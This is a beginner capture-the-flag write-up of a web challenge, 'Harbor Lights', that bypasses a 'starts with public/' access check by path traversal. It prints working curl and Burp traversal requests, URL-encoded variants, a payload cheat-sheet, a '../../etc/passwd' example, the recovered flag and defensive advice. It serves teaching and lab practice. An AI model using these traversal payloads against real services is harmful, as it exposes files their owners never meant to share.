# Harbor Lights — Beginner Writeup (Broken Access Control / Path Traversal)

> **Assumption stated up front:** The template I was handed had blank `CHALLENGE CONTEXT`
> fields, so I chose **one** solved challenge to write up: **Harbor Lights**. I picked it
> because it is the most beginner-friendly web challenge of the set — every step is doable
> with **curl** or your **browser**, and it needs **no Python or scripting at all**, which
> fits a reader who hasn't written Python yet. Everything below is the real challenge, the
> real requests, and the real flag.

---

## 1. Challenge Overview

**Harbor Lights** is a **web** challenge from the **Safaricom CTF (safctf)**. It presents a
small "object store" web service: an API that lets you *list* some stored files and
*download* them by name. The **goal** is to read a file the application does **not** want
you to see — one that holds the flag.

- Category: **Web — Broken Access Control**
- Difficulty: **Medium (300 points)**
- Service: `http://54.72.82.22:8390` (event-local; may be offline after the CTF)
- Flag: `safctf{0a7fe9c5e49d7fbe62cea634195d0adf}`

We will **not** spoil the method here — that starts in Section 3.

---

## 2. What You Need Before Starting

You can finish this with almost nothing installed. A beginner should budget **20 to 40 minutes**.

**Tools:**

- **curl** — a command-line tool to send web requests. Install on Kali/Debian/Ubuntu:
  ```
  sudo apt install curl
  ```
- **A web browser with DevTools** (Firefox or Chrome — already on Kali). You only need the
  **Network** tab, which records every request the page makes.
- **(Optional) Burp Suite** — a proxy that lets you catch and re-send requests by hand.
  It ships with Kali:
  ```
  sudo apt install burpsuite
  ```
  We will show the curl way first (simplest) and give the Burp equivalent where it helps.
- **python3 only for one tiny optional convenience** (URL-encoding). It is **not required** —
  we show a no-Python way too.

**Accounts / VPN:** none. The service is reached directly over HTTP. No login, no token.

---

## 3. Reconnaissance

The golden rule of web CTFs: **look before you poke.** Read the page, read what the API
tells you about itself, and only then start sending odd requests.

**Step 1 — Open the site in a browser and read it.**

Visit `http://54.72.82.22:8390`. It's a page titled "Harbor Lights" with a "Collection
desk" that links to a file called **`storage.json`** and a "Desk services" note describing
two API endpoints.

[SCREENSHOT: the Harbor Lights homepage showing the storage.json link and the "Desk services" text]

**Step 2 — Read what the API says about itself.** The page documents:

```
GET /api/objects          -> lists public object keys
GET /api/object?key=...   -> retrieves an object
```

In plain English: one endpoint **lists** file names ("keys"), the other **fetches** a file
by its key. That word "**public**" is a hint worth remembering.

**Step 3 — Download the `storage.json` file it advertises.** This is a config/manifest file;
these often leak more than intended.

```
curl -s http://54.72.82.22:8390/downloads/storage.json
```

Output:

```json
{
  "scope": "public/*",
  "inventory": [
    "public/lineup.txt",
    "public/receipts.json",
    "finance/final.txt"
  ],
  "adapter": "edge-store/4"
}
```

What this tells us: the store knows about **three** files, but its `scope` is only
`public/*`. Two files live under `public/` — and one, **`finance/final.txt`**, does **not**.
That is the odd one out, the thing we are probably meant to reach.

**Step 4 — Ask the API for the official list of keys.**

```
curl -s http://54.72.82.22:8390/api/objects
```

Output:

```json
{"keys":["public/lineup.txt","public/receipts.json"]}
```

The list **hides** `finance/final.txt`. So the file exists (the manifest proved it) but the
app won't advertise it. Classic "hidden but present" situation.

[SCREENSHOT: terminal showing storage.json listing three files but /api/objects listing only the two public ones]

**Step 5 — Try fetching each key the normal way.**

```
curl -s "http://54.72.82.22:8390/api/object?key=public/lineup.txt"
curl -s "http://54.72.82.22:8390/api/object?key=finance/final.txt"
```

Output:

```json
{"body":"The next performance begins at eight."}
{"message":"The request could not be completed.","ok":false}
```

The public file returns its contents. The `finance/final.txt` request is **refused**. So the
server *does* enforce something: it lets you read `public/...` but blocks anything else. That
refusal is the lock we now need to pick.

---

## 4. Identifying the Vulnerability

The vulnerability is **Broken Access Control**, and specifically a **path traversal** bypass
of a weak "prefix check."

**Define the terms (first time):**

- **Access control** = the rules deciding *who can read what*. "**Broken** access control"
  means those rules can be tricked.
- **Path traversal** = using special path text like `../` (which means "go up one folder")
  to step **out** of a folder you're allowed into and reach somewhere you're not. The `..`
  is the same "parent directory" you use with `cd ..` in a terminal.

**What's the root cause here?** The server almost certainly checks your requested key with a
rule like *"does it start with `public/`?"* — and if yes, it then goes and reads that path
from storage. The bug is that it checks the **text you sent** but reads the **resolved
path**, and those two can differ. If you send:

```
public/../finance/final.txt
```

the text **starts with** `public/` (so the check passes), but once the storage layer
*resolves* the `..`, it climbs out of `public/` and lands on `finance/final.txt` (so you get
the forbidden file). The guard checks the label on the door; the storage opens the real door.

**Analogy:** Imagine a mailroom clerk told "only hand over envelopes whose address starts
with *Public Wing*." You write **"Public Wing, then down the hall to the Finance Vault."**
The clerk sees "Public Wing" at the front, says "looks fine," and walks the whole route —
straight into the vault.

**What tipped us off during recon:**

1. The manifest (`storage.json`) listed a file (`finance/final.txt`) that the official list
   (`/api/objects`) hid — something is deliberately out of scope.
2. The `scope` was literally `"public/*"` — telling us the allow-rule is prefix-based.
3. Fetching the public file **worked**, fetching the finance file was **refused** — proving
   the server filters by key, which is exactly the kind of filter traversal defeats.

---

## 5. Exploitation Step by Step

We'll do it with **curl** first (one line), then show the identical move in **Burp Suite**.

**Step 1 — Confirm the "allowed" request works (our baseline).**

What/why: establish a known-good request so we can compare.

```
curl -s "http://54.72.82.22:8390/api/object?key=public/lineup.txt"
```

Expected output:

```json
{"body":"The next performance begins at eight."}
```

If you see a `body`, the endpoint and your syntax are correct. Good.

**Step 2 — Try the forbidden key directly (confirm the block).**

What/why: prove the straight path is denied, so later we know the bypass is what changed.

```
curl -s "http://54.72.82.22:8390/api/object?key=finance/final.txt"
```

Expected output:

```json
{"message":"The request could not be completed.","ok":false}
```

The `"ok":false` is the server saying **no**. This is the lock.

[SCREENSHOT: terminal showing the allowed key returning a body and the finance key returning "could not be completed"]

**Step 3 — Pick the lock with path traversal.**

What/why: we keep the `public/` prefix so the guard is happy, then add `../` to climb back
out and name the real target.

```
curl -s "http://54.72.82.22:8390/api/object?key=public/../finance/final.txt"
```

Expected output:

```json
{"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

What to look for: a `body` field instead of the refusal. The moment you see `safctf{...}`,
you've won. The server accepted the key because it **starts with** `public/`, then resolved
`..` and happily handed back `finance/final.txt`.

[SCREENSHOT: terminal showing the public/../finance/final.txt request returning the flag in the body field]

**Step 3 (variations that also work).** If the server slightly normalizes input, these
equivalent payloads do the same job — handy to know for other targets:

```
curl -s "http://54.72.82.22:8390/api/object?key=public/%2e%2e/finance/final.txt"
curl -s "http://54.72.82.22:8390/api/object?key=public/..%2ffinance%2ffinal.txt"
curl -s "http://54.72.82.22:8390/api/object?key=public/./../finance/final.txt"
```

`%2e` is a URL-encoded `.` and `%2f` is a URL-encoded `/`. **URL-encoding** just means
writing a character as `%` plus its hex code so it survives transport; servers decode it back
before use, which sometimes slips past naive filters.

### The same step in Burp Suite (optional)

If you prefer a point-and-click tool:

1. In Burp, go to **Proxy → Intercept** and make sure your browser traffic flows through Burp.
2. In the browser, load `http://54.72.82.22:8390/api/object?key=public/lineup.txt`.
3. Burp catches the request. Right-click it → **Send to Repeater**.
4. In **Repeater**, change the query to `key=public/../finance/final.txt`.
5. Click **Send**. Read the response pane on the right — the flag is in the `body` field.

[SCREENSHOT: Burp Repeater with the modified key= parameter on the left and the flag in the response on the right]

---

## 6. Capturing the Flag

The flag came back **directly in the JSON response** of the traversal request, in the `body`
field:

```json
{"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

So the flag is:

```
safctf{0a7fe9c5e49d7fbe62cea634195d0adf}
```

No decoding, no second step — the body **is** the file's contents, and the file's contents
are the flag. Copy it from the terminal (or the Burp response pane) and submit it.

---

## 7. Why This Works (Beginner Explanation)

Think back to the mailroom clerk. The developer wanted a simple safety rule: *"only serve
files inside the `public/` folder."* They implemented it by checking the **text** of the
requested name — "does it begin with `public/`?" — and then let the storage layer open
whatever path resulted. Those are two different machines looking at the key, and they
**disagree** about what it means. The guard reads it as a label; the filesystem reads it as a
route with turns in it (`..` = turn around, go up).

This is **Broken Access Control**, the #1 category on the OWASP Top 10 (the industry's list
of the most common web weaknesses). It shows up constantly in the real world: a photo app
that lets you fetch `/photos/123.jpg` but also `/photos/../config/secrets.env`; a document
portal where `?file=report.pdf` becomes `?file=../../etc/passwd`. The pattern is always the
same — a check on the *request* that doesn't match what the server *actually does* with it.

The lesson that generalizes: **whenever a server takes a name or path from you and uses it to
fetch something, test whether you can escape the intended area.** Prefixes, extensions, and
"allowed folders" are only as strong as the code that resolves them.

---

## 8. Common Mistakes and Dead Ends

1. **Dropping the `public/` prefix.** The payload `../finance/final.txt` **fails** — it does
   not start with `public/`, so the guard rejects it before traversal matters. We confirmed
   this during the solve: only payloads that *begin with* `public/` get through. Keep the
   prefix, then traverse.
2. **Reaching for an unrelated trick.** The servlet-style `..;/` bypass (`public/..;/finance/
   final.txt`) does **not** apply here — this isn't that kind of server, and it just returns
   the harmless public response. Match the technique to the target instead of spraying every
   payload.
3. **Ignoring the manifest.** Beginners often jump straight to the API and never download
   `storage.json`. That file is what *revealed* the hidden `finance/final.txt` key — without
   it you'd be guessing filenames blind.
4. **Forgetting to quote the URL.** In a shell, `&` and `?` are special. Always wrap the URL
   in quotes (`curl -s "http://.../api/object?key=..."`) or your command may break or run in
   the background.

---

## 9. How to Defend Against This

- **Resolve the path first, then check it.** Canonicalize the key (collapse all `..` and
  symlinks) and verify the *final, resolved* path is still inside the allowed directory —
  never trust the raw text the user sent.
- **Use an allow-list of exact keys, not a prefix match.** If only three objects are public,
  check the request against that exact list rather than "starts with `public/`."
- **Reject traversal sequences outright.** Deny any key containing `..`, encoded variants
  (`%2e%2e`, `..%2f`), or absolute paths — before processing.
- **Separate storage from naming.** Map user-facing keys to internal IDs (e.g. a database
  lookup) so a user-supplied string never becomes a filesystem path at all.
- **Enforce authorization per object.** Check that the caller is actually allowed to read the
  resolved object, independent of how they named it.

---

## 10. Key Takeaways

- **Broken Access Control** = the server's "who-can-read-what" rule can be fooled; **path
  traversal** (`../`) is one classic way to fool it.
- **Always read the manifest/config files** a site hands you (`storage.json` here) — they
  routinely leak hidden names and the shape of the access rule.
- A prefix check (`starts with public/`) is weak because the **check** and the **actual file
  read** can interpret the same string differently.
- Cheatsheet-worthy payloads to try whenever a `key=`/`file=`/`path=` parameter fetches
  something:
  ```
  key=public/../finance/final.txt
  key=public/%2e%2e/finance/final.txt
  key=public/..%2ffinance%2ffinal.txt
  ```
- Workflow worth saving: **curl to probe → read the response → tweak one parameter → curl
  again** (or the Burp **Send to Repeater** loop) is the core rhythm of web hacking.

You just did a real-world attack that lives on the OWASP Top 10 — the same bug class that
burns actual companies. If you followed every step and saw the flag appear, you're off to a
genuinely strong start. Keep going. 🚢



